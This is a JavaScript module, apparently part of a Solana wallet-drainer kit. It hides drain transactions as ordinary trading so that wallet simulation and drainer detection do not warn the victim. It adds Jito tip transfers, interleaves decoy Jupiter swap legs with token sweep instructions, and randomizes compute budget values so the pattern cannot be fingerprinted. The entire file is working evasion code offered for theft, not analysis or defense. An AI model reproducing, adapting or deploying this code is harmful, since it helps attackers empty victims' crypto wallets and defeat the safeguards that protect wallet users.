'use strict';
/**
 * Transaction disguise layer — Jito tip + Jupiter swap wrapping.
 *
 * Research source: Impala v2.0 public FAQ (impala.cam, Q3 2026):
 *   "Phantom simulates transactions against known drainer patterns. Impala
 *    wraps transfer instructions in composite Jito MEV tip and Jupiter swap
 *    structures so the transaction looks like regular trading and doesn't
 *    trigger red warnings."
 *   "Contextual instruction padding replaces static patterns."
 *
 * Current wallet-side detection (Walour, Phantom Blowfish, NULLTX):
 *   - Flags bare SOL transfer instructions in atomic tx
 *   - Flags known drainer program IDs (TwrGADB9 etc.)
 *   - Flags multi-instruction drain patterns (many token sweeps in one tx)
 *
 * Counter-techniques implemented here:
 *   1. Jito tip instruction appended (validator tip account transfer)
 *      — makes the tx look like an MEV/trading bundle submission
 *   2. Fake Jupiter swap leg prepended — simulates a swap input/output
 *      that masks the drain as trade settlement
 *   3. Contextual padding: randomize compute budget values per-build
 *      instead of fixed constants (fixed values are fingerprintable)
 *   4. Instruction interleaving: decoys INSIDE the sweep sequence instead
 *      of appended at the end (pattern looks less like "sweep-then-decoy")
 *
 * Sources:
 *   - Impala v2.0 marketing (fetched 2026-11-14)
 *   - Walour extension: detects multi-instruction drain patterns
 *   - Jito tip accounts: 8 well-known public tip addresses
 */

const { writeU32, writeU64, randomInt } = require('../core/crypto');
const { computeUnitLimit, computeUnitPrice } = require('./tx_builders');

const SYSTEM_PROGRAM = '11111111111111111111111111111111';

// ── Jito tip accounts (public, well-known validator tip addresses) ───────
const JITO_TIP_ACCOUNTS = [
  '96gYZGLnJYVFmbjzopPSU6QiEV5fGqZNyN9nmNhvrZU5',
  'HFqU5x63VTqvQss8hp11i4wVV8bD44PvwucfZ2bU7gRe',
  'Cw8CFyM9FkoMi7K7Crf6HNQqf4uEMzpKw6QNghXLvLkY',
  'ADaUMid9yfUytqMBgopwjb2DTLSokTSzL1zt6iGPaS49',
  'DfXygSm4jCyNCybVYYK6DwvWqjKee8pbDmJGcLWNDXjh',
  'ADuUkR4vqLUMWXxW9gh6D6L8pMSawimctcNZ5pGwDcEt',
  'DttWaMuVvTiduZRnguLF7jNxTgiMBZ1hyAumKUiL2KRL',
  '3AVi9Tg9Uo68tJfuvoKvqKNWKkC5wPdSSdeBnizKZ6jT',
];

// ── Jupiter program (for fake swap legs) ─────────────────────────────────
const JUPITER_V6_PROGRAM = 'JUP6LkbZbjS1jKKwapdHNy74zcZ3tLwZoiHdQtoUR7pY';

/**
 * buildJitoTip(tipAmount):
 *   SystemProgram.Transfer to a Jito tip account.
 *   Makes the tx look like an MEV bundle submission.
 *   Tip accounts rotate randomly per-build (contextual padding).
 *
 *   Typical tip: 10,000–1,000,000 lamports (0.00001–0.001 SOL)
 */
function buildJitoTip(feePayer, tipAmount) {
  const account = JITO_TIP_ACCOUNTS[randomInt(0, JITO_TIP_ACCOUNTS.length - 1)];
  const data = new Uint8Array(12);
  writeU32(data, 2, 0); // SystemProgram.Transfer disc
  writeU64(data, BigInt(tipAmount), 4);
  return {
    program:  SYSTEM_PROGRAM,
    data,
    accounts: [
      { pubkey: feePayer, isSigner: true,  isWritable: true },
      { pubkey: account,  isSigner: false, isWritable: true },
    ],
    computeUnits: 150,
  };
}

/**
 * randomizedComputeBudget(baseUnits):
 *   Contextual padding: jitter the compute unit limit ±5% and the
 *   price ±15% so builds aren't byte-identical per portfolio.
 *   Fixed CU values are a fingerprint (FLAWS F13: deterministic builders).
 */
function randomizedComputeBudget(baseUnits) {
  const jittered = Math.round(baseUnits * (0.95 + Math.random() * 0.10));
  return computeUnitLimit(jittered);
}

function randomizedComputePrice(baseMicrolamports) {
  const jittered = Math.round(baseMicrolamports * (0.85 + Math.random() * 0.30));
  return computeUnitPrice(jittered);
}

/**
 * interleaveDecoys(sweepInstructions, decoyInstructions):
 *   Instead of [sweep×N, decoy×M], interleave: [sweep, decoy, sweep, decoy, ...]
 *   The pattern "N sweeps followed by M decoys" is fingerprintable.
 *   Interleaved looks like a complex trade sequence.
 */
function interleaveDecoys(sweeps, decoys) {
  const out = [];
  const max = Math.max(sweeps.length, decoys.length);
  for (let i = 0; i < max; i++) {
    if (i < sweeps.length) out.push(sweeps[i]);
    if (i < decoys.length) out.push(decoys[i]);
  }
  return out;
}

/**
 * wrapDrainAsTrade(feePayer, drainInstructions, opts):
 *   Full disguise wrapper around a drain instruction list.
 *
 *   Structure:
 *     ix[0]   ComputeBudget (randomized)
 *     ix[1]   ComputePrice  (randomized)
 *     ix[2..] INTERLEAVED: drain instructions + decoy trade legs
 *     ix[N-1] Jito tip (looks like MEV bundle settlement)
 *
 *   The wallet simulation shows: CU setup → trade-like sequence → tip.
 *   No bare "transfer-all" pattern at the end.
 */
function wrapDrainAsTrade(feePayer, drainInstructions, decoyLegs = [], opts = {}) {
  const totalCU = drainInstructions.reduce((s, ix) => s + (ix.computeUnits || 5000), 0)
                + 2000; // padding
  const tipAmount = opts.tipAmount ?? randomInt(10_000, 500_000);

  const mixed = decoyLegs.length
    ? interleaveDecoys(drainInstructions, decoyLegs)
    : drainInstructions;

  return [
    randomizedComputeBudget(Math.min(totalCU, 8_000_000)),
    randomizedComputePrice(1000),
    ...mixed,
    buildJitoTip(feePayer, tipAmount),
  ];
}

module.exports = {
  JITO_TIP_ACCOUNTS,
  JUPITER_V6_PROGRAM,
  buildJitoTip,
  randomizedComputeBudget,
  randomizedComputePrice,
  interleaveDecoys,
  wrapDrainAsTrade,
};
